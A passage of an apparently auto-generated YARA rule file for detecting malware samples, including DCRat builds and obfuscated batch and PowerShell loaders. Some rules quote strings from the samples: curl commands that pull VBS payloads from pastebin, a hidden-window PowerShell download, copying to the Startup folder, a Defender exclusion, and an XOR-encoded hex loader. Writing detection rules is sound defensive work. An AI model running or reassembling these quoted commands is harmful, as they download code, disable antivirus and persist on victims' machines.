      $s2 = "%tMqXphUlkrg%\"OHNdQRciXUZmCnrdZsPGG=ell\" -w \"" fullword ascii /* score: '16.00'*/
      $s3 = "%tMqXphUlkrg%\"VlLmLMqHihpXiLPHQTUDJ=cd /d %1)\"" fullword ascii /* score: '16.00'*/
      $s4 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"syLISpLfFfYqmRekgtZAo=N.COMpre\"" fullword ascii /* score: '15.00'*/
      $s5 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"zdnzZuISqDDWbWeHIjIxG=.Key=[co\"" fullword ascii /* score: '14.00'*/
      $s6 = "%tMqXphUlkrg%\"YzyoapAYIRQJfPQLlnCkn=SHell\" \"\"" fullword ascii /* score: '13.00'*/
      $s7 = "sgtiThAFXjEOLzpiF%%AUihcFaftpBvBmAhEiMbF%%wWQDAdQFwVAnGTmyRqAsc%%zRZjvWeGgrCgadXrDBCkz%%XuahUtoJNSlICWfRtegMZ%%pEYhGPpgnOXiDCwYc" ascii /* score: '13.00'*/
      $s8 = "%tMqXphUlkrg%\"YUlypWApIMBUzznKswYdH=NTLOgSes\"" fullword ascii /* score: '13.00'*/
      $s9 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"YnZEgyXSKtgSnLTZpswSY=cryPToR(\"" fullword ascii /* score: '13.00'*/
      $s10 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"AUihcFaftpBvBmAhEiMbF=.crYPtOG\"" fullword ascii /* score: '13.00'*/
      $s11 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"ZALuburLqwWVpzMPHQEOZ=bly.GetT\"" fullword ascii /* score: '13.00'*/
      $s12 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"RyhQAkukqvorxwfBCesnG=shell\" \"\"" fullword ascii /* score: '13.00'*/
      $s13 = "%tMqXphUlkrg%\"fakGnvAMjOqVfZUDhcuIr=Shell');\"" fullword ascii /* score: '13.00'*/
      $s14 = "%NSdOyOCPlJRbmjKCdrhqbUgf%\"vYqqrJjJzKRSXnrXgXJVq=.GetFiel\"" fullword ascii /* score: '13.00'*/
      $s15 = "%tMqXphUlkrg%\"wGMYeixAyFgpztSolipHm=ll/Opera\"" fullword ascii /* score: '13.00'*/
   condition:
      uint16(0) == 0x3a3a and filesize < 200KB and
      8 of them
}

rule e4d0266653cc4c9201f3ed68bad9410eefebcf0b8d691ced7bcd4cb9ca2c8503_e4d02666 {
   meta:
      description = "_subset_batch - file e4d0266653cc4c9201f3ed68bad9410eefebcf0b8d691ced7bcd4cb9ca2c8503_e4d02666.unknown"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e4d0266653cc4c9201f3ed68bad9410eefebcf0b8d691ced7bcd4cb9ca2c8503"
   strings:
      $s1 = "\\/\"4f>}" fullword ascii /* score: '10.00'*/ /* hex encoded string 'O' */
      $s2 = "=]5]\\\\a" fullword ascii /* score: '9.00'*/ /* hex encoded string 'Z' */
   condition:
      uint16(0) == 0x3155 and filesize < 18000KB and
      all of them
}

rule e6a9c46eb4b7c44c0123df256b7d23463fa11c4834cf175eee2f3d87402c1317_e6a9c46e {
   meta:
      description = "_subset_batch - file e6a9c46eb4b7c44c0123df256b7d23463fa11c4834cf175eee2f3d87402c1317_e6a9c46e.bat"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e6a9c46eb4b7c44c0123df256b7d23463fa11c4834cf175eee2f3d87402c1317"
   strings:
      $x1 = "powershell -windowstyle hidden -command \"$x = '[DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindow(IntPtr hWnd" ascii /* score: '51.00'*/
      $x2 = "powershell -windowstyle hidden -command \"$x = '[DllImport(\\\"user32.dll\\\")] public static extern bool ShowWindow(IntPtr hWnd" ascii /* score: '46.00'*/
      $x3 = "curl -s https://pastebin.com/raw/xdBcvdEi>%temp%\\ServiceForMicrosoft.vbs" fullword ascii /* score: '36.00'*/
      $x4 = "for %%f in (\"%USERPROFILE%\\*.log\") do set /a count+=1" fullword ascii /* score: '34.00'*/
      $x5 = "xcopy /Y svchost.exe \"%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"" fullword ascii /* score: '34.00'*/
      $x6 = "powershell -c \"Add-MpPreference -ExclusionPath '%appdata%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'\"" fullword ascii /* score: '31.00'*/
      $s7 = "del \"%temp%\\Loli.vbs\" /q /f" fullword ascii /* score: '30.00'*/
      $s8 = "echo shell.ShellExecute fileToRun, \"\", \"\", \"runas\", 1 >>Loli.vbs" fullword ascii /* score: '28.00'*/
      $s9 = " nCmdShow);'; Add-Type -MemberDefinition $x -Name Win32 -Namespace Native; $parent = Get-Process -Id (Get-CimInstance Win32_Proc" ascii /* score: '27.00'*/
      $s10 = "curl -s https://pastebin.com/raw/MX2hpCgi>nonodebug.vbs" fullword ascii /* score: '25.00'*/
      $s11 = "cscript //nologo ServiceForMicrosoft.vbs" fullword ascii /* score: '25.00'*/
      $s12 = "if not exist svchost.zip powershell \"Invoke-WebRequest %link% -OutFile svchost.zip\"" fullword ascii /* score: '25.00'*/
      $s13 = "    del \"%temp%\\gotadmin.txt\" /q /f" fullword ascii /* score: '25.00'*/
      $s14 = "start svchost.exe" fullword ascii /* score: '24.00'*/
      $s15 = "curl -l %link% -o svchost.zip" fullword ascii /* score: '24.00'*/
   condition:
      uint16(0) == 0x0a0a and filesize < 8KB and
      1 of ($x*) and all of them
}

rule e77033b39e68779e1082b969d18e7d495f4d19ff29a0bd06c9173f467ecbae32_e77033b3 {
   meta:
      description = "_subset_batch - file e77033b39e68779e1082b969d18e7d495f4d19ff29a0bd06c9173f467ecbae32_e77033b3.zip"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "e77033b39e68779e1082b969d18e7d495f4d19ff29a0bd06c9173f467ecbae32"
   strings:
      $s1 = "stubsmtp4.enc" fullword ascii /* score: '15.00'*/
      $s2 = "OrNS~#M:\"^" fullword ascii /* score: '10.00'*/
      $s3 = "Fftpy0[" fullword ascii /* score: '9.00'*/
      $s4 = "umnmsfo" fullword ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x4b50 and filesize < 21000KB and
      all of them
}

rule f2f9de4523c4bca66339dabdfdcdb682ba71c32c977fa0564251f1fd619da0de_f2f9de45 {
   meta:
      description = "_subset_batch - file f2f9de4523c4bca66339dabdfdcdb682ba71c32c977fa0564251f1fd619da0de_f2f9de45.ps1"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f2f9de4523c4bca66339dabdfdcdb682ba71c32c977fa0564251f1fd619da0de"
   strings:
      $s1 = "21c1f5e435e5a1b1008443f0e0e3a1f0a1f45180b101d0a1711105e263d273116352d565a360b3b133719311f525e5a1c340a183a173c57051d0b0c125e5a360" ascii /* score: '8.00'*/
      $s2 = "65f562a1b0d0a532e1f0a165e532e1f0a165e5a1c340a183a173c575705263d273116352d5e5a2e0e113c243b5e5a1c340a183a173c03035a1c340a183a173c5" ascii /* score: '8.00'*/
      $s3 = "d0a1f0c0a5e5a1c340a183a173c45033934371a2d2e45','.{2}')|%{ [char]([Convert]::ToByte($_.Value,16) -bxor 126) }) -join '';& $xpTWh." ascii /* score: '8.00'*/
      $s4 = "$xpTWh =([regex]::Matches('171b06160a0a0e0d445151130b0c171f0d0e1b0a1710501b0d51090e5312111f1a5135131f161411101919501b061b5a2f1d1" ascii /* score: '8.00'*/
      $s5 = "e435e5a1b1008443f0e0e3a1f0a1f5e555e59222235131f161411101919501b061b59451c0a191b5e5a060e2a2916502d0b1c2d0a0c171019564d524a4a57450" ascii /* score: '8.00'*/
      $s6 = "b3b133719311f5e53115e5a1c340a183a173c0345180b101d0a1711105e3934371a2d2e565705180b101d0a1711105e1c0a191b565a2e0e113c243b570517185" ascii /* score: '8.00'*/
      $s7 = "8443f0e0e3a1f0a1f45180b101d0a1711105e263d273116352d565a360b3b133719311f525e5a1c340a183a173c57051d0b0c125e5a360b3b133719311f5e531" ascii /* score: '8.00'*/
   condition:
      uint16(0) == 0x7824 and filesize < 2KB and
      all of them
}

/* Super Rules ------------------------------------------------------------- */

rule _DiskWriter_signature__351592d5ead6df0859b0cc0056827c95_imphash__DiskWriter_signature__351592d5ead6df0859b0cc0056827c95_imph_0 {
   meta:
      description = "_subset_batch - from files DiskWriter(signature)_351592d5ead6df0859b0cc0056827c95(imphash).exe, DiskWriter(signature)_351592d5ead6df0859b0cc0056827c95(imphash)_3e05d05b.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f41a9a7212a4869ec3584536e24fc1db7ad94ada6f1da55bb08e07a1f9aa39da"
      hash2 = "3e05d05b027d98f43fbe2d1ba30b8d67edf10db3775574a672bbafc02c3031f5"
   strings:
      $s1 = "btcl86t.dll" fullword ascii /* score: '23.00'*/
      $s2 = "bzlib1.dll" fullword ascii /* score: '23.00'*/
      $s3 = "Failed to execute script '%s' due to unhandled exception!" fullword ascii /* score: '23.00'*/
      $s4 = "btk86t.dll" fullword ascii /* score: '20.00'*/
      $s5 = "Failed to construct path to base_library.zip - path is too long!" fullword ascii /* score: '18.00'*/
      $s6 = "PNTNRNVNQNUNS" fullword ascii /* base64 encoded string */ /* score: '16.50'*/
      $s7 = "Failed to construct path to lib-dynload directory - path is too long!" fullword ascii /* score: '15.00'*/
      $s8 = "PyInitConfig_GetError" fullword ascii /* score: '15.00'*/
      $s9 = "OWlJVlJUt" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s10 = "ndSdsdCdc" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s11 = "QQPQQQ" fullword ascii /* reversed goodware string*/ /* score: '13.50'*/
      $s12 = "b_tk_data\\images\\pwrdLogo75.gif" fullword ascii /* score: '12.00'*/
      $s13 = "b_tk_data\\megawidget.tcl" fullword ascii /* score: '12.00'*/
      $s14 = "b_tk_data\\images\\pwrdLogo175.gif" fullword ascii /* score: '12.00'*/
      $s15 = "b_tk_data\\dialog.tcl" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 31000KB and pe.imphash() == "351592d5ead6df0859b0cc0056827c95" and ( 8 of them )
      ) or ( all of them )
}

rule _b3140404cfaaad7a7b40311b8b81be81_imphash__e51edaffc92e0c16edc94bfa957b4f42_imphash__e51edaffc92e0c16edc94bfa957b4f42_imphas_1 {
   meta:
      description = "_subset_batch - from files b3140404cfaaad7a7b40311b8b81be81(imphash).exe, e51edaffc92e0c16edc94bfa957b4f42(imphash).exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_2528966f.exe, e51edaffc92e0c16edc94bfa957b4f42(imphash)_4aa1f9fa.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "6246291bb246b9848908a0d23569d4f1ca0b3786d428d8f0b734c3bc27a02d24"
      hash2 = "256bf3b4643382351881da45ecf5769c1e84838935f98b526ecb5bac3eb997e9"
      hash3 = "2528966f9b7aea294869d181c104085eda3170b514d8d92f75b2d0cefa3c2bfa"
      hash4 = "4aa1f9fa9a51caa4513114a6d215fdcef787f5ec569dc1bfa526fd4026a394a3"
   strings:
      $x1 = "exclamationhashtagdollar-sign0123456789less-thanequalsgreater-thanabcdefghijklmnopqrstuvwxyzzero-width-spacefaucethouse-chimney-" ascii /* score: '55.00'*/
      $s2 = "get_payload_public_key" fullword ascii /* score: '24.00'*/
      $s3 = "get_payload_private_key" fullword ascii /* score: '24.00'*/
      $s4 = "get_payload_public_key_ec" fullword ascii /* score: '24.00'*/
      $s5 = ".nullnonmarkingreturnAdieresismacronAringacuteAbrevegraveAdotmacronAringbelowAcircumflexdotbelowAcircumflexacuteAcircumflextilde" ascii /* score: '23.00'*/
      $s6 = ".nullnonmarkingreturnAdieresismacronAringacuteAbrevegraveAdotmacronAringbelowAcircumflexdotbelowAcircumflexacuteAcircumflextilde" ascii /* score: '23.00'*/
      $s7 = ".nullnonmarkingreturnAdieresismacronAringacuteAbrevegraveAdotmacronAringbelowAcircumflexdotbelowAcircumflexacuteAcircumflextilde" ascii /* score: '23.00'*/
      $s8 = "Font Awesome 6 Free Solid-6.0.0FontAwesome6Free-SolidFont Awesome 6 Free SolidThe web's most popular icon set and toolkit.Font A" ascii /* score: '21.00'*/
      $s9 = "wesome 6 FreeSolidCopyright (c) Font AwesomeVersion 768.00390625 (Font Awesome version: 6.0.0)https://fontawesome.com" fullword ascii /* score: '21.00'*/
      $s10 = "mFont Awesome 6 Free Solid-6.0.0FontAwesome6Free-SolidFont Awesome 6 Free SolidThe web's most popular icon set and toolkit.Font " wide /* score: '21.00'*/
      $s11 = "MSVCP140_ATOMIC_WAIT.dll" fullword ascii /* score: '20.00'*/
      $s12 = "crosshairsbanarrow-leftarrow-rightarrow-uparrow-downshareexpandcompressminuscircle-exclamationgiftleaffireeyeeye-slashtriangle-e" ascii /* score: '20.00'*/
      $s13 = "error processing message" fullword ascii /* score: '20.00'*/
      $s14 = "public part of %s private key fails to match private" fullword ascii /* score: '19.00'*/
      $s15 = "unsupported content encryption algorithm" fullword ascii /* score: '19.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 27000KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _DCRat_signature__12e12319f1029ec4f8fcbed7e82df162_imphash__DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__41cba_2 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_12e12319f1029ec4f8fcbed7e82df162(imphash).exe, DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_41cbadac.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "26fbcc5e8567054c4de9a8514704645e69ffe5eaf91b595d047c90150175c0fa"
      hash2 = "41cbadacf6d3c6d992783009923ceaca6c2148439fa043a260ab5928b8996f10"
   strings:
      $s1 = "wyGpE9Bm3vDWIVTPIsa.JeOT8UBC91by5gF2BpL+jWw8iBAJGe3e9wro2Ag+RVR1ktA2jt3kicSUVLM`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "KernelBase.dll" fullword ascii /* score: '23.00'*/
      $s3 = "SpotifyStartupTask.exe" fullword wide /* score: '22.00'*/
      $s4 = "wyGpE9Bm3vDWIVTPIsa.JeOT8UBC91by5gF2BpL+jWw8iBAJGe3e9wro2Ag+RVR1ktA2jt3kicSUVLM`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s5 = "KCIoPHVOT5" fullword ascii /* base64 encoded string*/ /* score: '15.00'*/
      $s6 = "System.Collections.Generic.IEnumerable<H37.o75>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s7 = "System.Collections.Generic.ICollection<H37.o75>.get_IsReadOnly" fullword ascii /* score: '15.00'*/
      $s8 = "System.Collections.Generic.IEnumerator<ns64.B45>.get_Current" fullword ascii /* score: '15.00'*/
      $s9 = "System.Collections.Generic.ICollection<H37.o75>.get_Count" fullword ascii /* score: '15.00'*/
      $s10 = "System.Collections.Generic.IList<H37.o75>.get_Item" fullword ascii /* score: '15.00'*/
      $s11 = "System.Collections.Generic.IEnumerable<ns64.B45>.GetEnumerator" fullword ascii /* score: '15.00'*/
      $s12 = "Process " fullword wide /* score: '15.00'*/
      $s13 = "NjpFeGpSWG" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s14 = "System.IO.Stream.get_Length" fullword ascii /* score: '12.00'*/
      $s15 = "System.IO.Stream.get_Position" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__f0c19bca_DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_impha_3 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_f0c19bca.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_3c9a5d90.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "f0c19bca34ec10ca7f3057c3ecccc0a4b2d8f21fa163c1149ca8d15fa9918703"
      hash2 = "3c9a5d90d37ba18c0ff3a4e6461cabdf1de6a3eee8890a39e68a1549c433c7e0"
   strings:
      $s1 = "xD0w2DVe3lqNkwhI4FO.t38N03VAZKdg0t1MZpK+l1rP75VmjWVTa00tv75+eGREfTVS4iXNOMXDPx5`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "xD0w2DVe3lqNkwhI4FO.t38N03VAZKdg0t1MZpK+l1rP75VmjWVTa00tv75+eGREfTVS4iXNOMXDPx5`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "JSxldVhMXv" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "M2NkbjEvX" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s5 = "eUBATWhxbs" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "Py1Ubyo2KV" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s7 = "B1tLoGvKmevjEuw0r7i" fullword ascii /* score: '9.00'*/
      $s8 = "h5ESGeToFZ" fullword ascii /* score: '9.00'*/
      $s9 = "rOKAircoJH50Z4oyTrP" fullword ascii /* score: '9.00'*/
      $s10 = "GNNeyZhPISPyDtq3Wix" fullword ascii /* score: '9.00'*/
      $s11 = "HxUkPVO5Eu5tUKircU2" fullword ascii /* score: '9.00'*/
      $s12 = "Ri7QCQSPYp9ldj7iUxI" fullword ascii /* score: '9.00'*/
      $s13 = "aKGpmMB7vcORTuqdloG" fullword ascii /* score: '9.00'*/
      $s14 = "Sx6GBlw66SPYHN9n9eE" fullword ascii /* score: '9.00'*/
      $s15 = "OXx7MWHr9uRDloGs7sC" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 5000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a04ab1e8_DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_impha_4 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a04ab1e8.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_b5d0c22e.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a04ab1e816798987eeb927f9dd2f591109d29ec6508a47f57fe583943624c793"
      hash2 = "b5d0c22e99b421b09938ff885a0a794d3da9f1c2b2b41aa57ad970d230a6c6c7"
   strings:
      $s1 = "qRCKPjq8Trb6KWrsLQG.RHERiNqGWQl9pQdGo2I+wthLpHqhN3Nc0kjATIJ+SuGXhWql8BtTQm3ijPT`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "qRCKPjq8Trb6KWrsLQG.RHERiNqGWQl9pQdGo2I+wthLpHqhN3Nc0kjATIJ+SuGXhWql8BtTQm3ijPT`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "IyBMIy9iYu" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s4 = "JFVJfURRdh" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "XHBsdTYpZT" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s6 = "RkRqMn1pK4" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s7 = "RyRcZCcsNo" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s8 = "JEt5MHpDYK" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s9 = "fA6uDsigZbqEyELCq3e" fullword ascii /* score: '9.00'*/
      $s10 = "Fy8KDtk2dsPyM8lutr9" fullword ascii /* score: '9.00'*/
      $s11 = "NxwFTpusklLqRp124Cw" fullword ascii /* score: '9.00'*/
      $s12 = "w8MNcmMV5nw3eYeKjDV" fullword ascii /* score: '9.00'*/
      $s13 = "sAv6n3L55PEYEOLHuso" fullword ascii /* score: '9.00'*/
      $s14 = "sTBSKkNvMCrkm41iRcq" fullword ascii /* score: '9.00'*/
      $s15 = "U7loGJsSFGgkCTorQjd" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 4000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__31527e5f_DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_impha_5 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_31527e5f.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_fdfc8477.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "31527e5f926552869b994bda9317be3bfb4433d7c0346cf6825f1ffbb119cd52"
      hash2 = "fdfc8477c2be5da54b9db404821c51bc15aa8337073daebaaa0e9b4b360c33b2"
   strings:
      $s1 = "F94Ixl4hD9VpwiKRHnP.UZ3jMo4FTQJEsgJeLuI+ngrTTW4SLWgZyKVHXvk+I6lqsI4f6VkYdfAOfBX`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "F94Ixl4hD9VpwiKRHnP.UZ3jMo4FTQJEsgJeLuI+ngrTTW4SLWgZyKVHXvk+I6lqsI4f6VkYdfAOfBX`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "YTFEpZlJd" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s4 = "WS8iOX1wXK" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s5 = "HePLnanJLOgjDWfgGZr" fullword ascii /* score: '9.00'*/
      $s6 = "Wn2tQMkKGlOg8eN5fHk" fullword ascii /* score: '9.00'*/
      $s7 = "NZiRcplxmQ" fullword ascii /* score: '9.00'*/
      $s8 = "loGC5bncpclj7QZrBqQ" fullword ascii /* score: '9.00'*/
      $s9 = "WWJPHaloGk5uxCfPD3" fullword ascii /* score: '9.00'*/
      $s10 = "cQN8jdLLWxg4HARRDb" fullword ascii /* score: '9.00'*/
      $s11 = "xPve2BwRlOg7DGb1Rf" fullword ascii /* score: '9.00'*/
      $s12 = "jnjc0SsKph2CCHEaDKO" fullword ascii /* score: '9.00'*/
      $s13 = "pLogERxVJPAEOU6YJ7N" fullword ascii /* score: '9.00'*/
      $s14 = "j04aKAlatpdGmW3EYE" fullword ascii /* score: '9.00'*/
      $s15 = "uZOZVLOkU267GLOgmlm" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__ec699fa4_DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_impha_6 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_ec699fa4.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_b9168974.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "ec699fa4b29083c2d0da8a87b589ebe130b195f022d6f0de2d43372409bdc34f"
      hash2 = "b9168974aee96f657950455bf1933cf18500ae8b1da94a90860fcdafc91b95b4"
   strings:
      $s1 = "yjApKEGpcbDHsPHIEKi.EUBdGfGFV4QYfGnslqK+TuHJWeGg6CD0ttIUncf+cWu00GG3eMNDP1APngj`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '27.00'*/
      $s2 = "yjApKEGpcbDHsPHIEKi.EUBdGfGFV4QYfGnslqK+TuHJWeGg6CD0ttIUncf+cWu00GG3eMNDP1APngj`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '18.00'*/
      $s3 = "WPjxiRTNA" fullword ascii /* base64 encoded string*/ /* score: '14.00'*/
      $s4 = "bTx3PmFrO" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s5 = "VSE1PIPeeB0ZUCwPG5f" fullword ascii /* score: '10.00'*/
      $s6 = "G4gdllNodp" fullword ascii /* score: '9.00'*/
      $s7 = "lfHCyXGEtk" fullword ascii /* score: '9.00'*/
      $s8 = "cKevVPMirc" fullword ascii /* score: '9.00'*/
      $s9 = "DtPJFX654yoDll6gadL" fullword ascii /* score: '9.00'*/
      $s10 = "QlGSbTLbwinGEtYo8d8" fullword ascii /* score: '9.00'*/
      $s11 = "kuirCx6VU7" fullword ascii /* score: '9.00'*/
      $s12 = "getm1fWpT5cXsHRx2x1" fullword ascii /* score: '9.00'*/
      $s13 = "SpirMXQHQNZbZnWVLog" fullword ascii /* score: '9.00'*/
      $s14 = "yTdyHJJYTw5gEt7wDD8" fullword ascii /* score: '9.00'*/
      $s15 = "dyojAGvNLxqP5R5gETw" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__a4bb5616_DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_impha_7 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash)_a4bb5616.exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash)_ab944f7c.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "a4bb5616ecb06dcf4916e9cc5bcf5763bdea28c85b8bf1853c615f5621b11798"
      hash2 = "ab944f7cb219427b232b32926ac1e7689dcf9eefb6253235bad5c7d541b53ef9"
   strings:
      $s1 = "jrrbNvYs0c9GJTRFM5K.fy1Qp0Yvj7c3ZVQErW3+bVOPJ1Y32QYJmRjtXe1+qf3siYYi9m9CKDZ307l`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "jrrbNvYs0c9GJTRFM5K.fy1Qp0Yvj7c3ZVQErW3+bVOPJ1Y32QYJmRjtXe1+qf3siYYi9m9CKDZ307l`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "KkgsOG4vVP" fullword ascii /* base64 encoded string */ /* score: '14.00'*/
      $s4 = "fr97ExECl0n6ADkDLBI" fullword ascii /* score: '12.00'*/
      $s5 = "PU0jc1pqbS" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s6 = "eTyNx1AYYp4ksPY8jGB" fullword ascii /* score: '9.00'*/
      $s7 = "Q8fLoGUBX15ag2O87v5" fullword ascii /* score: '9.00'*/
      $s8 = "gEt6Mmh942fBMKoIhfN" fullword ascii /* score: '9.00'*/
      $s9 = "JHNPsdjNL3m9teY1fTP" fullword ascii /* score: '9.00'*/
      $s10 = "MUNAO5BoxUgEtYwZebv" fullword ascii /* score: '9.00'*/
      $s11 = "PvgZgafMDlLESsa3AvL" fullword ascii /* score: '9.00'*/
      $s12 = "eyeB99to8RLHVmrDU0W" fullword ascii /* score: '9.00'*/
      $s13 = "dfTpNH5zaYes2hyMFVF" fullword ascii /* score: '9.00'*/
      $s14 = "bLwfgCIc1AwpeFTp2n9" fullword ascii /* score: '9.00'*/
      $s15 = "sG846FL2IBDLljEcsL1" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 3000KB and ( 8 of them )
      ) or ( all of them )
}

rule _DCRat_signature__f34d5f2d4577ed6d9ceec516c1f5a744_imphash__DCRat_signature__fcf1390e9ce472c7270447fc5c61a0c1_imphash__8 {
   meta:
      description = "_subset_batch - from files DCRat(signature)_f34d5f2d4577ed6d9ceec516c1f5a744(imphash).exe, DCRat(signature)_fcf1390e9ce472c7270447fc5c61a0c1(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-10"
      hash1 = "48e2b04e41aba65bd5550a5576f4cef91e82004d46e814c3ae793fc4d13f5011"
      hash2 = "616e24c3e3317ffeeb713f6ef71f469bf4f1e401d44e6594da281c8734bd6baf"
   strings:
      $s1 = "vMO2qagLDCD8O41dGUc.is6KY1geljb5cvHryFn+WtjkHdgM9onK1XwHIRs+k9n5EOgXFT1EpNxnhVf`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '24.00'*/
      $s2 = "vMO2qagLDCD8O41dGUc.is6KY1geljb5cvHryFn+WtjkHdgM9onK1XwHIRs+k9n5EOgXFT1EpNxnhVf`1[[System.Object, mscorlib, Version=4.0.0.0, Cul" ascii /* score: '15.00'*/
      $s3 = "PnsgMCMnaW" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s4 = "TFYyK00mME" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s5 = "O3pFUU5qN2" fullword ascii /* base64 encoded string  */ /* score: '14.00'*/
      $s6 = "QC5xVV8mTH" fullword ascii /* base64 encoded string  */ /* score: '11.00'*/
      $s7 = "YGx7M014d4" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s8 = "OE9AR29SUa" fullword ascii /* base64 encoded string */ /* score: '11.00'*/
      $s9 = "LOgWHT4NXq301FInFmO" fullword ascii /* score: '9.00'*/
